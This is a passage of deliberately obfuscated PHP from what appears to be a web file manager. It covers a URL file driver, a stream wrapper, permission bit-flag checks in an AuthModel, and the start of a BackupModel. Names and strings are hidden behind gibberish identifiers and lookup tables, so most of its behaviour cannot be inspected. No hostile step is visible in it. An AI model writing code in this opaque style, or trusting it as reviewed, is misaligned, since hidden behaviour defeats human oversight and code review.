$ùğøÃ£[$‡İÕì·“[1627]] : null); $Ö‰‚çÁ·[$‡İÕì·“[1594]] = isset($ùğøÃ£[$‡İÕì·“[1628]]) ? strtotime($ùğøÃ£[$‡İÕì·“[1628]]) : $Ö‰‚çÁ·[$‡İÕì·“[1593]]; return $Ö‰‚çÁ·; } protected function _isFolder($¦ûèË·) { $×êĞËÅ› =& $_SERVER[´‹ô¯Œ]; if ($¦ûèË· == $×êĞËÅ›[12] || $¦ûèË· == $×êĞËÅ›[8]) { return !0; } $¼³ó¾Ìê = $this->_objectMeta($¦ûèË·); return isset($¼³ó¾Ìê[$×êĞËÅ›[33]]) && $¼³ó¾Ìê[$×êĞËÅ›[33]] == $×êĞËÅ›[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($íåìï = false) { } public function exist($î¼¶ü÷Ş) { $§ˆòá¦¾ = $this->info($î¼¶ü÷Ş); return $§ˆòá¦¾[$_SERVER[´‹ô¯Œ][235]]; } public function isFile($çüÖ±•Â) { $™™¿Û¾È = $this->info($çüÖ±•Â); return $™™¿Û¾È[$_SERVER[´‹ô¯Œ][235]]; } public function isFolder($ÕÈ‹òŒ) { return !1; } public function size($êèõª›) { $×¯¼× = $this->info($êèõª›); return $×¯¼×[$_SERVER[´‹ô¯Œ][79]]; } public function info($­¿ü©¶) { return $this->infoParse($­¿ü©¶); } public function infoAuth($·É•Ö±) { return $this->infoParse($·É•Ö±); } public function infoWithChildren($¦¤–¤îÔ) { return $this->infoParse($¦¤–¤îÔ); } public function infoFull($ÜÅÛ¿ƒá) { return $this->infoParse($ÜÅÛ¿ƒá); } private function infoParse($²‘ñ’åâ) { $‘¯ı—ÏÜ =& $_SERVER[´‹ô¯Œ]; $ûˆÑüàÜ = $this->header($²‘ñ’åâ); if (!$ûˆÑüàÜ || !$ûˆÑüàÜ[$‘¯ı—ÏÜ[836]]) { return !1; } $ä²ñøÎ = _get($ûˆÑüàÜ, $‘¯ı—ÏÜ[415], 0); $ßæÊÜºÑ = array($‘¯ı—ÏÜ[32] => $ûˆÑüàÜ[$‘¯ı—ÏÜ[32]], $‘¯ı—ÏÜ[87] => $²‘ñ’åâ, $‘¯ı—ÏÜ[33] => $‘¯ı—ÏÜ[233], $‘¯ı—ÏÜ[79] => intval($ä²ñøÎ), $‘¯ı—ÏÜ[169] => get_path_ext($ûˆÑüàÜ[$‘¯ı—ÏÜ[32]]), $‘¯ı—ÏÜ[1480] => $ä²ñøÎ > 0 && $ûˆÑüàÜ[$‘¯ı—ÏÜ[1629]], $‘¯ı—ÏÜ[1481] => !1); return $ßæÊÜºÑ; } private function header($ÉïÊêÅ) { $Åô¡µÔ™ =& $_SERVER[´‹ô¯Œ]; if (isset(self::$_cacheHeader[$ÉïÊêÅ])) { return self::$_cacheHeader[$ÉïÊêÅ]; } $ »Àùˆë = isset($GLOBALS[$Åô¡µÔ™[1630]]) ? $GLOBALS[$Åô¡µÔ™[1630]] : !1; $GLOBALS[$Åô¡µÔ™[1630]] = !0; self::$_cacheHeader[$ÉïÊêÅ] = url_header($ÉïÊêÅ); $GLOBALS[$Åô¡µÔ™[1630]] = $ »Àùˆë; return self::$_cacheHeader[$ÉïÊêÅ]; } public function hashSimple($¡™çÄôÇ, $…ğ€ä” = false) { $åÑ—»ĞÅ =& $_SERVER[´‹ô¯Œ]; $ú¡»¡Ï¿ = $this->info($¡™çÄôÇ); if (!$ú¡»¡Ï¿ || !$ú¡»¡Ï¿[$åÑ—»ĞÅ[235]]) { return !1; } $ÉïÆéŒ  = $ú¡»¡Ï¿[$åÑ—»ĞÅ[79]]; $üú‚×¸Ğ = 200; $èĞÊáÇ = 50; if ($ÉïÆéŒ  <= $üú‚×¸Ğ * $èĞÊáÇ) { return md5($this->fileSubstr($¡™çÄôÇ, 0, $ÉïÆéŒ )) . $ÉïÆéŒ ; } $äÂ»”¼’ = intval($ÉïÆéŒ  / $èĞÊáÇ); $Å®ü³¢ = $åÑ—»ĞÅ[12]; $¥……È§ = timeFloat(); $Ğ¤¶²§É = 15; for ($ƒ§ü¬œ = 0; $ƒ§ü¬œ < $èĞÊáÇ; $ƒ§ü¬œ++) { if (timeFloat() - $¥……È§ > $Ğ¤¶²§É) { return !1; } $¤Õ§’¶â = $this->fileSubstr($¡™çÄôÇ, $äÂ»”¼’ * $ƒ§ü¬œ, $üú‚×¸Ğ); if (!$¤Õ§’¶â) { return !1; } $Å®ü³¢ .= $¤Õ§’¶â; } $Å®ü³¢ .= $this->fileSubstr($¡™çÄôÇ, $ÉïÆéŒ  - $üú‚×¸Ğ, $üú‚×¸Ğ); return md5($Å®ü³¢) . $ÉïÆéŒ ; } public function getContent($ÂÆ”î¢Ñ) { return $this->fileSubstr($ÂÆ”î¢Ñ); } public function fileSubstr($ÔÎˆÙ€, $Û›¹ôÈÊ = 0, $îù†– = -1) { $Ù¼÷ËÃÈ =& $_SERVER[´‹ô¯Œ]; $¦”ñØ¢ß = $this->info($ÔÎˆÙ€); if (!$¦”ñØ¢ß || !$¦”ñØ¢ß[$Ù¼÷ËÃÈ[235]] && $¦”ñØ¢ß[$Ù¼÷ËÃÈ[79]] > 1024 * 1024 * 10) { return !1; } if ($îù†– === -1) { $îù†– = $¦”ñØ¢ß[$Ù¼÷ËÃÈ[79]]; } if ($îù†– == 0) { return $Ù¼÷ËÃÈ[12]; } $”åä½€‰ = array($Ù¼÷ËÃÈ[1631] . $Û›¹ôÈÊ . $Ù¼÷ËÃÈ[873] . ($Û›¹ôÈÊ + $îù†– - 1)); $é‡–İı = url_request($ÔÎˆÙ€, $Ù¼÷ËÃÈ[1520], !1, $”åä½€‰, !1, !1, 30); return $é‡–İı[$Ù¼÷ËÃÈ[1304]] ? $é‡–İı[$Ù¼÷ËÃÈ[1304]] : $Ù¼÷ËÃÈ[12]; } public function download($å©öÙİ˜, $Ø¿­Éûó) { Downloader::start($å©öÙİ˜, $Ø¿­Éûó); return $Ø¿­Éûó; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ñœ¥Ãâ, $éÜœì²­ = '') { $this->info = $this->info($Ñœ¥Ãâ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[´‹ô¯Œ][87]]; $this->pathOpen = $Ñœ¥Ãâ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ñœ¥Ãâ])) { self::$_chunkBuffer[$Ñœ¥Ãâ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Á±™şëÌ) { $Çîß˜ş¯ = $this->fileSubstr($this->pose, $Á±™şëÌ); $this->pose += strlen($Çîß˜ş¯); return $Çîß˜ş¯; } public function stream_tell() { return $this->pose; } public function stream_seek($íÎ—ØÚ, $ÖÖÏ×—†) { $À‰Ïö¸® =& $_SERVER[´‹ô¯Œ]; if ($ÖÖÏ×—† == SEEK_SET) { $this->pose = $íÎ—ØÚ; } else { if ($ÖÖÏ×—† == SEEK_CUR) { $this->pose += $íÎ—ØÚ; } else { if ($ÖÖÏ×—† == SEEK_END) { $this->pose = $this->info[$À‰Ïö¸®[79]] + intval($íÎ—ØÚ); } } } if ($íÎ—ØÚ < 0) { $this->pose = $this->info[$À‰Ïö¸®[79]] + $íÎ—ØÚ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[´‹ô¯Œ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($àÒå×ÖŞ, $‹Ÿòå”) { $Õê‡²©ë =& $_SERVER[´‹ô¯Œ]; $ãÕ°•ØÉ = $this->info($àÒå×ÖŞ); return array($Õê‡²©ë[1424] => 0, $Õê‡²©ë[1632] => 0, $Õê‡²©ë[16] => 32768 + 511, $Õê‡²©ë[1633] => 0, $Õê‡²©ë[1634] => 0, $Õê‡²©ë[1635] => 0, $Õê‡²©ë[1636] => 0, $Õê‡²©ë[79] => $ãÕ°•ØÉ[$Õê‡²©ë[79]], $Õê‡²©ë[1637] => $ãÕ°•ØÉ[$Õê‡²©ë[1479]], $Õê‡²©ë[1594] => $ãÕ°•ØÉ[$Õê‡²©ë[88]], $Õê‡²©ë[1593] => $ãÕ°•ØÉ[$Õê‡²©ë[234]], $Õê‡²©ë[1638] => 0, $Õê‡²©ë[1639] => 0); } static $fileInfo = array(); public function info($À¬ÁËÙ’) { $™ùß¤ıî = $_SERVER[´‹ô¯Œ][1640]; if (isset(self::$fileInfo[$À¬ÁËÙ’])) { return self::$fileInfo[$À¬ÁËÙ’]; } if (substr($À¬ÁËÙ’, 0, strlen($™ùß¤ıî)) != $™ùß¤ıî) { return !1; } self::$fileInfo[$À¬ÁËÙ’] = IO::info(substr($À¬ÁËÙ’, strlen($™ùß¤ıî))); return self::$fileInfo[$À¬ÁËÙ’]; } public static function read($´©³…Ù, $¼€Ù’ü®, $ï¡¹‚¶¬) { if (!isset(self::$_fopenCache[$´©³…Ù])) { $‘¤‘­ÒË = new StreamWrapperIO(); $‘¤‘­ÒË->stream_open($´©³…Ù); self::$_fopenCache[$´©³…Ù] = $‘¤‘­ÒË; } $‘¤‘­ÒË = self::$_fopenCache[$´©³…Ù]; return $‘¤‘­ÒË->fileSubstr($¼€Ù’ü®, $ï¡¹‚¶¬); } public static function _read($Öˆ¿¿´Ï, $‡ÖÆ®”, $ªÏÙâí¤) { $Ñ“şÌü¸ =& $_SERVER[´‹ô¯Œ]; $¨Î‘ã³‡ = fopen($Öˆ¿¿´Ï, $Ñ“şÌü¸[1483]); if (!$¨Î‘ã³‡) { return $Ñ“şÌü¸[12]; } $£ØÔ•™œ = 8192; fseek($¨Î‘ã³‡, $‡ÖÆ®”, SEEK_SET); $ï²¬“Âª = $Ñ“şÌü¸[12]; $Ÿ“¦Øñ = 0; while ($Ÿ“¦Øñ < $ªÏÙâí¤) { $ˆß¢¥ë = min($£ØÔ•™œ, $ªÏÙâí¤ - $Ÿ“¦Øñ); $ï²¬“Âª .= fread($¨Î‘ã³‡, $ˆß¢¥ë); $Ÿ“¦Øñ += $ˆß¢¥ë; } fclose($¨Î‘ã³‡); return $ï²¬“Âª; } public function fileSubstr($Í…Æ„, $Àõ‘¤Ñ•) { $°¶ß°ßÕ =& $_SERVER[´‹ô¯Œ]; $´ş·øãŞ = $this->info[$°¶ß°ßÕ[79]]; $Û˜––íß = $Í…Æ„; $ï´°îç = $Àõ‘¤Ñ•; if ($Í…Æ„ < 0) { $Í…Æ„ = $´ş·øãŞ + $Í…Æ„; } if ($Àõ‘¤Ñ• === !1) { $Àõ‘¤Ñ• = $´ş·øãŞ - $Í…Æ„; } if ($Í…Æ„ + $Àõ‘¤Ñ• > $´ş·øãŞ) { $Àõ‘¤Ñ• = $´ş·øãŞ - $Í…Æ„; } if ($Àõ‘¤Ñ• <= 0) { return $°¶ß°ßÕ[12]; } if ($Í…Æ„ < 0 || $Í…Æ„ >= $´ş·øãŞ || $Àõ‘¤Ñ• <= 0 || $Àõ‘¤Ñ• > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\x69\x6c\x65\122\x65\141\x64\x20\x65\162\x72\157\x72\41\x20\163\x74\x61\x72\x74\75{$Í…Æ„}\73\x6c\x65\156\147\x74\x68\x3d{$Àõ‘¤Ñ•}\x3b\x20\163\x69\172\145\75{$´ş·øãŞ}\73"); } $êŸĞ² = 64 * 1024; $«Ó³¿… =& self::$_chunkBuffer[$this->path]; if (!$«Ó³¿…) { $«Ó³¿… = array(); } $ìğ„ÕÀ¯ = 0; $Ğ»ëçûˆ = 0; $¯«†™²ú = $°¶ß°ßÕ[12]; foreach ($«Ó³¿… as $ìğ„ÕÀ¯ => $¯«†™²ú) { $ìğ„ÕÀ¯ = intval($ìğ„ÕÀ¯); $Ğ»ëçûˆ = $ìğ„ÕÀ¯ + strlen($¯«†™²ú); if ($Í…Æ„ >= $Ğ»ëçûˆ) { continue; } if ($Í…Æ„ >= $ìğ„ÕÀ¯ && $Í…Æ„ + $Àõ‘¤Ñ• <= $Ğ»ëçûˆ) { return substr($¯«†™²ú, $Í…Æ„ - $ìğ„ÕÀ¯, $Àõ‘¤Ñ•); } break; } if (count($«Ó³¿…) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($°¶ß°ßÕ[1641], $°¶ß°ßÕ[1642] . count($«Ó³¿…) . "\73\163\x74\141\162\164\75{$Í…Æ„}\54\x6c\145\x6e\x67\x74\x68\x3d{$Àõ‘¤Ñ•}\x3b\x70\157\163\x65\72{$ìğ„ÕÀ¯}\x7e{$Ğ»ëçûˆ}"); throw new Exception($°¶ß°ßÕ[1643]); } $¨¦Æ©ú¨ = intval($Í…Æ„ / $êŸĞ²) * $êŸĞ²; $“İÇÓ£ˆ = ceil(($Í…Æ„ + $Àõ‘¤Ñ•) / $êŸĞ²) * $êŸĞ² - $¨¦Æ©ú¨; $œ·ƒÒş = IO::fileSubstr($this->path, $¨¦Æ©ú¨, $“İÇÓ£ˆ); $«Ó³¿…[$¨¦Æ©ú¨ . $°¶ß°ßÕ[12]] = $œ·ƒÒş; ksort($«Ó³¿…); $‡‰Óôô = substr($œ·ƒÒş, $Í…Æ„ - $¨¦Æ©ú¨, $Àõ‘¤Ñ•); return $‡‰Óôô; } private function log($ø…Ù­Ó, $¯æ­¯Ú’) { $ÌÙí“…¼ =& $_SERVER[´‹ô¯Œ]; $±¤óëá¦ = timeFloat() - $this->timeStart; write_log(sprintf($ÌÙí“…¼[1644], $ø…Ù­Ó, $this->info[$ÌÙí“…¼[32]], $±¤óëá¦, $¯æ­¯Ú’), $ÌÙí“…¼[1281]); } } goto Aùƒäøì­À; C“¢çäØ‰À: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¡ªÓå¾¨ =& $_SERVER[´‹ô¯Œ]; $§º°”• = array(array($¡ªÓå¾¨[506] => LNG($¡ªÓå¾¨[1997]), $¡ªÓå¾¨[1998] => $¡ªÓå¾¨[1999], $¡ªÓå¾¨[2000] => 1, $¡ªÓå¾¨[2001] => 1, $¡ªÓå¾¨[2002] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¡ªÓå¾¨[506] => LNG($¡ªÓå¾¨[2003]), $¡ªÓå¾¨[1998] => $¡ªÓå¾¨[2004], $¡ªÓå¾¨[2000] => 2, $¡ªÓå¾¨[2001] => 1, $¡ªÓå¾¨[2002] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¡ªÓå¾¨[506] => LNG($¡ªÓå¾¨[2005]), $¡ªÓå¾¨[1998] => $¡ªÓå¾¨[2006], $¡ªÓå¾¨[2000] => 3, $¡ªÓå¾¨[2001] => 1, $¡ªÓå¾¨[2002] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¡ªÓå¾¨[506] => LNG($¡ªÓå¾¨[2007]), $¡ªÓå¾¨[1998] => $¡ªÓå¾¨[2008], $¡ªÓå¾¨[2000] => 4, $¡ªÓå¾¨[2001] => 1, $¡ªÓå¾¨[2002] => self::AUTH_SHOW | self::AUTH_VIEW), array($¡ªÓå¾¨[506] => LNG($¡ªÓå¾¨[2009]), $¡ªÓå¾¨[1998] => $¡ªÓå¾¨[2010], $¡ªÓå¾¨[2000] => 5, $¡ªÓå¾¨[2001] => 1, $¡ªÓå¾¨[2002] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¡ªÓå¾¨[506] => LNG($¡ªÓå¾¨[2011]), $¡ªÓå¾¨[1998] => $¡ªÓå¾¨[2012], $¡ªÓå¾¨[2000] => 6, $¡ªÓå¾¨[2001] => 1, $¡ªÓå¾¨[2002] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¡ªÓå¾¨[506] => LNG($¡ªÓå¾¨[2013]), $¡ªÓå¾¨[1998] => $¡ªÓå¾¨[2014], $¡ªÓå¾¨[2000] => 7, $¡ªÓå¾¨[2001] => 1, $¡ªÓå¾¨[2002] => 0)); return $§º°”•; } public static function authCheck($àŠ€†ê, $ÜÆæª¸¾) { $ŒÄ˜„‰ =& $_SERVER[´‹ô¯Œ]; $àŠ€†ê = intval($àŠ€†ê); if (KodUser::isRoot() && $GLOBALS[$ŒÄ˜„‰[6]][$ŒÄ˜„‰[2015]]) { return !0; } if ($àŠ€†ê <= 0) { return !1; } if (($àŠ€†ê & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($àŠ€†ê & $ÜÆæª¸¾); } public static function authCheckShow($Ö€ªºÅ) { return self::authCheck($Ö€ªºÅ, self::AUTH_SHOW); } public static function authCheckView($¶–Ëáü ) { return self::authCheck($¶–Ëáü , self::AUTH_VIEW); } public static function authCheckDownload($¨”¶ˆ¨ë) { return self::authCheck($¨”¶ˆ¨ë, self::AUTH_DOWNLOAD); } public static function authCheckUpload($À¼«Úçæ) { return self::authCheck($À¼«Úçæ, self::AUTH_UPLOAD); } public static function authCheckEdit($Î¹åÜÊ‚) { return self::authCheck($Î¹åÜÊ‚, self::AUTH_EDIT); } public static function authCheckRemove($ôÉ‰Âˆç) { return self::authCheck($ôÉ‰Âˆç, self::AUTH_REMOVE); } public static function authCheckShare($üŞïŒ¢) { return self::authCheck($üŞïŒ¢, self::AUTH_SHARE); } public static function authCheckComment($‚›ÈõÂ) { return self::authCheck($‚›ÈõÂ, self::AUTH_COMMENT); } public static function authCheckEvent($“Á¸¾çú) { return self::authCheck($“Á¸¾çú, self::AUTH_EVENT); } public static function authCheckRoot($¿§Ãª) { return self::authCheck($¿§Ãª, self::AUTH_ROOT); } public static function authCheckAction($•ÙçÂïÖ, $æ¦Ëõ) { $œĞÔî•î =& $_SERVER[´‹ô¯Œ]; $—¿ë¿Ç³ = array($œĞÔî•î[2016] => self::AUTH_VIEW, $œĞÔî•î[1296] => self::AUTH_DOWNLOAD, $œĞÔî•î[110] => self::AUTH_UPLOAD, $œĞÔî•î[1966] => self::AUTH_EDIT, $œĞÔî•î[1965] => self::AUTH_REMOVE, $œĞÔî•î[1976] => self::AUTH_SHARE, $œĞÔî•î[432] => self::AUTH_COMMENT, $œĞÔî•î[1783] => self::AUTH_EVENT, $œĞÔî•î[2017] => self::AUTH_ROOT); if (!isset($—¿ë¿Ç³[$æ¦Ëõ])) { return; } $ì™½æış = $—¿ë¿Ç³[$æ¦Ëõ]; $•ÙçÂïÖ = intval($•ÙçÂïÖ); if ($•ÙçÂïÖ <= 0) { return !1; } if (($•ÙçÂïÖ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($•ÙçÂïÖ & $ì™½æış); } public static function authDisable($Ğı¦Æ©», $·íöçòĞ) { if (intval($Ğı¦Æ©») <= 0) { return 0; } return intval($Ğı¦Æ©») & ~$·íöçòĞ; } public $optionType = "\x53\x79\x73\164\145\x6d\x2e\163\x6f\x75\x72\x63\x65\101\165\164\150\x4c\151\x73\x74"; public $field = array("\156\141\x6d\145", "\x61\165\164\150", "\x6c\141\x62\x65\x6c", "\144\x69\163\x70\x6c\x61\171", "\163\171\163\164\x65\x6d", "\x73\x6f\162\x74"); public function initData() { $Ì¾ô† £ = $this->authDefault(); foreach ($Ì¾ô† £ as $±ïàÁ¾Û) { $this->add($±ïàÁ¾Û); } } public function findAuth($ÚÚûšúÇ, $±£äÂ×…) { $½€ïÌ¢ =& $_SERVER[´‹ô¯Œ]; $‰ì¹„º¬ = parent::listData(); foreach ($‰ì¹„º¬ as $’›Í¹Ë•) { $ìÃÄé¤ = intval($’›Í¹Ë•[$½€ïÌ¢[499]]); if ($ìÃÄé¤ <= 0 || $’›Í¹Ë•[$½€ïÌ¢[2018]] == 0) { continue; } if (($ìÃÄé¤ & $ÚÚûšúÇ) != $ÚÚûšúÇ) { continue; } if (($ìÃÄé¤ & $±£äÂ×…) != 0) { continue; } return $’›Í¹Ë•[$½€ïÌ¢[487]]; } return !1; } public function findAuthMax($Ï‚µ£œ¶, $ÚáÌµÍÂ) { $‰ËÃÂ¶ =& $_SERVER[´‹ô¯Œ]; $ÑªñÊÑ´ = !1; $ÙÍ¯Çîè = parent::listData(); foreach ($ÙÍ¯Çîè as $×íğ°Ñ) { $–•³õ©ª = intval($×íğ°Ñ[$‰ËÃÂ¶[499]]); if ($–•³õ©ª <= 0 || $×íğ°Ñ[$‰ËÃÂ¶[2018]] == 0) { continue; } if (($–•³õ©ª & $Ï‚µ£œ¶) != $Ï‚µ£œ¶) { continue; } if (($–•³õ©ª & $ÚáÌµÍÂ) != 0) { continue; } if (!$ÑªñÊÑ´) { $ÑªñÊÑ´ = $×íğ°Ñ; continue; } if (intval($ÑªñÊÑ´[$‰ËÃÂ¶[499]]) < $–•³õ©ª) { $ÑªñÊÑ´ = $×íğ°Ñ; } } return $ÑªñÊÑ´ ? $ÑªñÊÑ´[$‰ËÃÂ¶[487]] : !1; } public function findAuthReadOnly() { $âÊ ›ñ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÆğºÅ‰Ö = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($âÊ ›ñ, $ÆğºÅ‰Ö); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ÑÒÓâïï =& $_SERVER[´‹ô¯Œ]; $ğçÖ›¾¯ = parent::listData(); $ÄäôÎœ÷ = !1; foreach ($ğçÖ›¾¯ as $ÅŸß«íé) { if ($ÅŸß«íé[$ÑÒÓâïï[499]] <= 0 || $ÅŸß«íé[$ÑÒÓâïï[2018]] == $ÑÒÓâïï[231]) { continue; } if (!$ÄäôÎœ÷) { $ÄäôÎœ÷ = $ÅŸß«íé; continue; } if ($ÄäôÎœ÷[$ÑÒÓâïï[499]] > $ÅŸß«íé[$ÑÒÓâïï[499]]) { $ÄäôÎœ÷ = $ÅŸß«íé; } } return $ÄäôÎœ÷ ? $ÄäôÎœ÷[$ÑÒÓâïï[487]] : $ÑÒÓâïï[12]; } public function listData($µØº—»Á = false, $İŒó™Ù® = "\x73\x6f\162\164", $ñ—ûä¸Û = false) { return parent::listData($µØº—»Á, $İŒó™Ù®, $ñ—ûä¸Û); } public function update($ö—Ü¢, $¼¼úæ–) { $‹±ô—¿† =& $_SERVER[´‹ô¯Œ]; $ÀÊ²šĞ = parent::listData($ö—Ü¢); $Ë•€ï¶Å = $this->findByName($¼¼úæ–[$‹±ô—¿†[32]]); if (!$ÀÊ²šĞ || $Ë•€ï¶Å && $Ë•€ï¶Å[$‹±ô—¿†[487]] != $ÀÊ²šĞ[$‹±ô—¿†[487]]) { return !1; } $this->filterAuth($¼¼úæ–[$‹±ô—¿†[499]]); return parent::update($ö—Ü¢, $¼¼úæ–); } public function remove($ù ı“ÎÍ) { $»ñŸ¾ûé = parent::listData($ù ı“ÎÍ); if (!$»ñŸ¾ûé || $»ñŸ¾ûé[$_SERVER[´‹ô¯Œ][192]]) { return !1; } return parent::remove($ù ı“ÎÍ); } public function add($¡®ø¨üÄ = array()) { $‡‹ƒ®æ£ =& $_SERVER[´‹ô¯Œ]; if ($this->findByName($¡®ø¨üÄ[$‡‹ƒ®æ£[32]])) { return !1; } $â®ßş­ø = array($‡‹ƒ®æ£[32] => $‡‹ƒ®æ£[12], $‡‹ƒ®æ£[499] => 1, $‡‹ƒ®æ£[2019] => $‡‹ƒ®æ£[2006], $‡‹ƒ®æ£[2018] => 1, $‡‹ƒ®æ£[192] => 0, $‡‹ƒ®æ£[2020] => 0); $¡®ø¨üÄ = array_merge($â®ßş­ø, $¡®ø¨üÄ); $¡®ø¨üÄ[$‡‹ƒ®æ£[2020]] = $this->getSort(); $this->filterAuth($¡®ø¨üÄ[$‡‹ƒ®æ£[499]]); return parent::insert($¡®ø¨üÄ); } private function getSort() { $ŞæƒŒÇØ =& $_SERVER[´‹ô¯Œ]; $‘òˆË”˜ = parent::listData(); $ Ş°¥í‡ = array_to_keyvalue($‘òˆË”˜, $ŞæƒŒÇØ[12], $ŞæƒŒÇØ[2020]); return empty($ Ş°¥í‡) ? 0 : max($ Ş°¥í‡) + 1; } private function filterAuth(&$´êšÏ¨) { if (!$´êšÏ¨) { return; } $ôêì¯÷¯ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¸ïÇ×† = array(); foreach ($ôêì¯÷¯ as $ò«şğ¥“) { if ($´êšÏ¨ & $ò«şğ¥“) { $¸ïÇ×†[] = $ò«şğ¥“; } } if (in_array(self::AUTH_ROOT, $¸ïÇ×†)) { $´êšÏ¨ = array_sum($ôêì¯÷¯); return; } $£ä·€Îñ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¸ïÇ×† as $ò«şğ¥“) { if (isset($£ä·€Îñ[$ò«şğ¥“])) { $¸ïÇ×† = array_merge($¸ïÇ×†, $£ä·€Îñ[$ò«şğ¥“]); } } $¸ïÇ×†[] = self::AUTH_SHOW; $´êšÏ¨ = array_sum(array_unique($¸ïÇ×†)); } public function sort($–öÛ¸–æ, $ûÂò«Õ) { return parent::update($–öÛ¸–æ, $ûÂò«Õ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\142\x61\x63\153\165\x70\114\x69\163\164"; public $field = array("\x69\157", "\156\x61\155\145", "\163\164\x61\x74\165\163", "\x63\157\156\x74\x65\156\164", "\x6d\x61\156\165\141\x6c", "\162\145\x73\x75\x6c\x74", "\164\151\x6d\145\106\x72\157\155", "\164\x69\155\145\124\x6f"); public function config() { $ˆÆÊ§±ò =& $_SERVER[´‹ô¯Œ]; Action($ˆÆÊ§±ò[2021])->taskInit(); $åŠœ¦ˆŒ = Model($ˆÆÊ§±ò[856])->get($ˆÆÊ§±ò[863]); $åŠœ¦ˆŒ = json_decode($åŠœ¦ˆŒ, !0); $åŠœ¦ˆŒ = is_array($åŠœ¦ˆŒ) ? $åŠœ¦ˆŒ : array(); $this->parseContent($åŠœ¦ˆŒ); unset($åŠœ¦ˆŒ[$ˆÆÊ§±ò[1765]]); Model($ˆÆÊ§±ò[1764])->cacheClear(); $ğ¦©«  = $ˆÆÊ§±ò[2022]; $…Ê£ªÏÔ = Model($ˆÆÊ§±ò[2023])->findByKey($ˆÆÊ§±ò[1783], $ğ¦©« ); if (!$…Ê£ªÏÔ) { $…Ê£ªÏÔ = array(); } if (isset($…Ê£ªÏÔ[$ˆÆÊ§±ò[207]])) { $…Ê£ªÏÔ[$ˆÆÊ§±ò[207]] = json_decode($…Ê£ªÏÔ[$ˆÆÊ§±ò[207]], !0); } if (isset($åŠœ¦ˆŒ[$ˆÆÊ§±ò[207]])) { $…Ê£ªÏÔ[$ˆÆÊ§±ò[207]][$ˆÆÊ§±ò[1768]] = $åŠœ¦ˆŒ[$ˆÆÊ§±ò[207]]; unset($åŠœ¦ˆŒ[$ˆÆÊ§±ò[207]]); } return array_merge($…Ê£ªÏÔ, $åŠœ¦ˆŒ); } public function listData($Çş»Š›Î = false, $â’€ØÚË = "\x6d\x6f\x64\151\146\171\x54\151\155\145", $áŞêÚ = false) { $ŸÊ„â¡á = parent::listData($Çş»Š›Î, $â’€ØÚË, !0); if (!$ŸÊ„â¡á) { return $ŸÊ„â¡á; } if ($Çş»Š›Î) { $ŸÊ„â¡á = array($ŸÊ„â¡á); } foreach ($ŸÊ„â¡á as &$¯ğãÜ²—) { $this->parseContent($¯ğãÜ²—); } return $Çş»Š›Î ? $ŸÊ„â¡á[0] : $ŸÊ„â¡á; } public function parseContent(&$ùİ€¨) { $¬ğµÌºú =& $_SERVER[´‹ô¯Œ]; $¿š£ƒÜÖ = _get($ùİ€¨, $¬ğµÌºú[171], $¬ğµÌºú[91]); if (!in_array($¿š£ƒÜÖ, array($¬ğµÌºú[862], $¬ğµÌºú[1224]))) { $ùİ€¨[$¬ğµÌºú[171]] = $¿š£ƒÜÖ == $¬ğµÌºú[91] ? $¬ğµÌºú[1224] : $¬ğµÌºú[862]; } } public function lastItem() { $Ó†ôŞÓû = $this->listData(); return !empty($Ó†ôŞÓû[0]) ? $Ó†ôŞÓû[0] : null; } public function 